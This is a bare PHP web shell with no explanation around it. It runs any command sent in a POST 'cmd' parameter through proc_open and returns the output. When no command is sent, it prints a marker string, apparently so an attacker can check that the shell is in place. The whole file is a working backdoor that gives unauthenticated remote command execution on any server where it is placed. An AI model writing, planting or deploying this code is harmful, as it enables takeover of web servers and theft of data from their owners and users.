<?php
if (isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    function exec_command($command)
    {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["file", "error-output.txt", "a"],
        ];
        $cwd = "";
        $env = ["some_option" => "aeiou"];
        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
        if (is_resource($process)) {
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
    }
    exec_command($cmd);
    exit();
} else {
    echo "al4xs";
}
?>
